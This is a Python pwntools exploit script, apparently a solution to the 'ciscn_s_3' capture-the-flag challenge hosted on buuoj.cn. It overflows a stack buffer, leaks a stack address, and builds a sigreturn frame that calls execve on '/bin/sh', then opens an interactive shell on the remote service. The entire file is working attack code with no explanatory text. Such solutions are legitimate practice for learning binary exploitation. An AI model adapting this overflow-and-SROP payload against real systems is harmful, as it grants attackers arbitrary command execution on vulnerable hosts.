from pwn import *
context(os='linux',arch='amd64',log_level='debug')
# io  = remote('192.168.95.128',10001)
io = remote('node4.buuoj.cn',28954)
elf = ELF('./ciscn_s_3')

pause()

main_addr = elf.symbols["main"]
signreturn_mov_rax_ret_addr = 0x4004da
sys_call_addr = 0x400517
data_save_addr = 0x601020
vul_rw_addr = 0x4004F1

# payload = flat(b"A"*16, signreturn_mov_rax_ret_addr, sys_call_addr,)

payload = b"/bin/sh\x00"
payload += b'\x00' * 8
payload += p64(vul_rw_addr)

io.send(payload)

print(io.recv(32))

leak_stack_addr = io.recv(6)
leak_stack_addr = leak_stack_addr.ljust(8,b"\x00")
leak_stack_addr = u64(leak_stack_addr)
input_str_stack_addr = leak_stack_addr - 0x128
input_str_stack_addr_2 = leak_stack_addr - 0x118
print(hex(input_str_stack_addr))
print(hex(input_str_stack_addr_2))

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = input_str_stack_addr_2 # /bin/sh
frame.rsi = 0x0
frame.rdx = 0x0
frame.rip = sys_call_addr

# print(frame)
pause()

payload = flat(b"A"*16,signreturn_mov_rax_ret_addr,sys_call_addr,frame)

print(payload)


io.sendline(payload)

pause()

io.interactive()

pause()
